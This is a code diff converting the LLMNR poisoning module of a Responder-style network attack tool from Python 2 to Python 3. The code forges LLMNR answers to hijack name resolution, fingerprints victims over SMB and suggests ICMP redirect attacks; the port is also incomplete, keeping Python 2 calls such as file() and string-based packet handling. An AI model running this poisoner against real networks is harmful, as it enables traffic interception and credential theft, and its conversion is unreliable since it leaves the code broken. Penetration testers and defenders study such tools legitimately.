@@ -18,58 +18,58 @@ import struct
 import core.responder.fingerprint
 
 from core.responder.packets import LLMNR_Ans
-from SocketServer import BaseRequestHandler
+from socketserver import BaseRequestHandler
 from core.responder import responder_settings
 from core.responder import utils
 
 
 def Parse_LLMNR_Name(data):
-	NameLen = struct.unpack('>B',data[12])[0]
-	return data[13:13+NameLen]
+    NameLen = struct.unpack('>B',data[12])[0]
+    return data[13:13+NameLen]
 
 
 def IsICMPRedirectPlausible(IP):
-	dnsip = []
-	for line in file('/etc/resolv.conf', 'r'):
-		ip = line.split()
-		if len(ip) < 2:
-		   continue
-		elif ip[0] == 'nameserver':
-			dnsip.extend(ip[1:])
-	for x in dnsip:
-		if x != "127.0.0.1" and utils.IsOnTheSameSubnet(x,IP) is False:
-			print utils.color("[Analyze mode: ICMP] You can ICMP Redirect on this network.", 5)
-			print utils.color("[Analyze mode: ICMP] This workstation (%s) is not on the same subnet than the DNS server (%s)." % (IP, x), 5)
-			print utils.color("[Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.", 5)
+    dnsip = []
+    for line in file('/etc/resolv.conf', 'r'):
+        ip = line.split()
+        if len(ip) < 2:
+            continue
+        elif ip[0] == 'nameserver':
+            dnsip.extend(ip[1:])
+    for x in dnsip:
+        if x != "127.0.0.1" and utils.IsOnTheSameSubnet(x,IP) is False:
+            print(utils.color("[Analyze mode: ICMP] You can ICMP Redirect on this network.", 5))
+            print(utils.color("[Analyze mode: ICMP] This workstation (%s) is not on the same subnet than the DNS server (%s)." % (IP, x), 5))
+            print(utils.color("[Analyze mode: ICMP] Use `python tools/Icmp-Redirect.py` for more details.", 5))
 
 if responder_settings.Config.AnalyzeMode:
-	IsICMPRedirectPlausible(responder_settings.Config.Bind_To)
+    IsICMPRedirectPlausible(responder_settings.Config.Bind_To)
 
 
 class LLMNR(BaseRequestHandler):  # LLMNR Server class
-	def handle(self):
-		data, soc = self.request
-		Name = Parse_LLMNR_Name(data)
+    def handle(self):
+        data, soc = self.request
+        Name = Parse_LLMNR_Name(data)
 
-		# Break out if we don't want to respond to this host
-		if utils.RespondToThisHost(self.client_address[0], Name) is not True:
-			return None
+        # Break out if we don't want to respond to this host
+        if utils.RespondToThisHost(self.client_address[0], Name) is not True:
+            return None
 
-		if data[2:4] == "\x00\x00" and utils.Parse_IPV6_Addr(data):
-			Finger = None
-			if responder_settings.Config.Finger_On_Off:
-				Finger = fingerprint.RunSmbFinger((self.client_address[0], 445))
+        if data[2:4] == "\x00\x00" and utils.Parse_IPV6_Addr(data):
+            Finger = None
+            if responder_settings.Config.Finger_On_Off:
+                Finger = fingerprint.RunSmbFinger((self.client_address[0], 445))
 
-			if responder_settings.Config.AnalyzeMode:
-				LineHeader = "[Analyze mode: LLMNR]"
-				print utils.color("%s Request by %s for %s, ignoring" % (LineHeader, self.client_address[0], Name), 2, 1)
-			else:  # Poisoning Mode
-				Buffer = LLMNR_Ans(Tid=data[0:2], QuestionName=Name, AnswerName=Name)
-				Buffer.calculate()
-				soc.sendto(str(Buffer), self.client_address)
-				LineHeader = "[*] [LLMNR]"
-				print utils.color("%s  Poisoned answer sent to %s for name %s" % (LineHeader, self.client_address[0], Name), 2, 1)
+            if responder_settings.Config.AnalyzeMode:
+                LineHeader = "[Analyze mode: LLMNR]"
+                print(utils.color("%s Request by %s for %s, ignoring" % (LineHeader, self.client_address[0], Name), 2, 1))
+            else:  # Poisoning Mode
+                Buffer = LLMNR_Ans(Tid=data[0:2], QuestionName=Name, AnswerName=Name)
+                Buffer.calculate()
+                soc.sendto(str(Buffer), self.client_address)
+                LineHeader = "[*] [LLMNR]"
+                print(utils.color("%s  Poisoned answer sent to %s for name %s" % (LineHeader, self.client_address[0], Name), 2, 1))
 
-			if Finger is not None:
-				print utils.text("[FINGER] OS Version     : %s" % utils.color(Finger[0], 3))
-				print utils.text("[FINGER] Client Version : %s" % utils.color(Finger[1], 3))
+            if Finger is not None:
+                print(utils.text("[FINGER] OS Version     : %s" % utils.color(Finger[0], 3)))
+                print(utils.text("[FINGER] Client Version : %s" % utils.color(Finger[1], 3)))
